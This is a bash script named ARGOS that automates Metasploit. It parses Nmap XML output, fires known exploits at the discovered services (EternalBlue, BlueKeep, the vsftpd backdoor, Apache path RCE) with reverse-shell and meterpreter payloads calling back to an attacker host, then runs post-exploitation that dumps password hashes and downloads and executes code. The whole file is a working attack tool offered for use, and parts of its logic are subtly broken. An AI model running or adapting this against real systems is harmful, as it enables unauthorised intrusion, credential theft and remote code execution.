#!/usr/bin/env bash
###############################################################################
# ARGOS - Metasploit Automation 
# Version: 2.5
# Author: 
###############################################################################

# Strict error handling
set -euo pipefail
trap 'echo -e "${RED}[-] Error at line $LINENO${RESET}"; exit 1' ERR

# Configuration
source "$(dirname "$0")/../lib/argos_lib.sh"
initialize_colors
check_root
load_config

# Global Variables
declare -A EXPLOIT_MAP
LOOT_DIR="./loot/metasploit/$(date +%Y%m%d)"
SESSION_LOG="$LOOT_DIR/sessions.log"
MSF_RC="$TMP_DIR/msf_autopwn.rc"

# Exploit Database Mapping
init_exploit_db() {
    EXPLOIT_MAP=(
        ['ftp']='exploit/unix/ftp/vsftpd_234_backdoor'
        ['smb']='exploit/windows/smb/ms17_010_eternalblue'
        ['http']='exploit/multi/http/apache_normalize_path_rce'
        ['ssh']='exploit/linux/ssh/sshexec'
        ['mssql']='exploit/windows/mssql/mssql_payload'
        ['rdp']='exploit/windows/rdp/cve_2019_0708_bluekeep'
    )
}

# Generate Metasploit resource file
generate_rc() {
    local target="$1"
    local lhost="$2"
    local lport="$3"
    
    echo "use auxiliary/scanner/portscan/tcp" > "$MSF_RC"
    echo "set PORTS 1-65535" >> "$MSF_RC"
    echo "set RHOSTS $target" >> "$MSF_RC"
    echo "run" >> "$MSF_RC"
    echo "exit" >> "$MSF_RC"
    
    for port in "${!SERVICE_MAP[@]}"; do
        local service="${SERVICE_MAP[$port]}"
        case $service in
            'ftp'|'smb'|'http'|'ssh')
                echo "use ${EXPLOIT_MAP[$service]}" >> "$MSF_RC"
                echo "set RHOSTS $target" >> "$MSF_RC"
                echo "set RPORT $port" >> "$MSF_RC"
                echo "set PAYLOAD $(get_payload $service)" >> "$MSF_RC"
                echo "set LHOST $lhost" >> "$MSF_RC"
                echo "set LPORT $lport" >> "$MSF_RC"
                echo "set VERBOSE true" >> "$MSF_RC"
                echo "run" >> "$MSF_RC"
                echo "sleep 10" >> "$MSF_RC"
                ;;
        esac
    done
    
    echo "sessions -l" >> "$MSF_RC"
    echo "sleep 10" >> "$MSF_RC"
    echo "exit" >> "$MSF_RC"
}

# Payload selector
get_payload() {
    local service="$1"
    case $service in
        'windows/*') echo "windows/x64/meterpreter/reverse_tcp";;
        'linux/*') echo "linux/x86/meterpreter/reverse_tcp";;
        *) echo "generic/shell_reverse_tcp";;
    esac
}

# Post-exploitation module
post_exploit() {
    local session_id="$1"
    echo -e "${CYAN}[*] Starting post-exploitation on session $session_id${RESET}"
    
    msfconsole -q -x "
        sessions -v;
        sessions -i $session_id;
        getuid;
        sysinfo;
        run post/multi/manage/shell_to_meterpreter;
        run post/unix/gather/hashdump;
        run post/multi/manage/download_exec;
        background;
    " | tee -a "$SESSION_LOG"
}

# Main execution flow
main() {
    init_directories
    init_exploit_db
    
    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --xml)
                XML_FILE="$2"
                shift 2
                ;;
            --lhost)
                LHOST="$2"
                shift 2
                ;;
            --lport)
                LPORT="$2"
                shift 2
                ;;
            *)
                echo -e "${RED}[!] Unknown option: $1${RESET}"
                exit 1
                ;;
        esac
    done

    [ -z "$XML_FILE" ] && { echo -e "${RED}[!] Nmap XML file required${RESET}"; exit 1; }
    [ -z "$LHOST" ] && LHOST=$(ip route get 1 | awk '{print $7}')
    [ -z "$LPORT" ] && LPORT=4444

    # Parse Nmap XML
    echo -e "${GREEN}[+] Parsing Nmap XML output${RESET}"
    TARGET_IP=$(xmlstarlet sel -t -v "//address/@addr" "$XML_FILE" | head -1)
    declare -A SERVICE_MAP
    
    while read -r port; do
        service=$(xmlstarlet sel -t -v "//port[@portid='$port']/service/@name" "$XML_FILE")
        SERVICE_MAP["$port"]="$service"
    done < <(xmlstarlet sel -t -v "//port/@portid" "$XML_FILE")

    # Generate automation script
    generate_rc "$TARGET_IP" "$LHOST" "$LPORT"

    # Start Metasploit
    echo -e "${CYAN}[*] Launching Metasploit Framework${RESET}"
    msfconsole -qr "$MSF_RC" | tee "$LOOT_DIR/metasploit_console.log"

    # Handle sessions
    while read -r session; do
        if [[ $session =~ ([0-9]+).*opened ]]; then
            session_id="${BASH_REMATCH[1]}"
            post_exploit "$session_id"
        fi
    done < <(grep "opened" "$LOOT_DIR/metasploit_console.log")

    # Generate report
    echo -e "${GREEN}[+] Generating Metasploit report${RESET}"
    python3 "$LIB_DIR/report_generator.py" --module metasploit --input "$LOOT_DIR"
}

# Entry point
main "$@"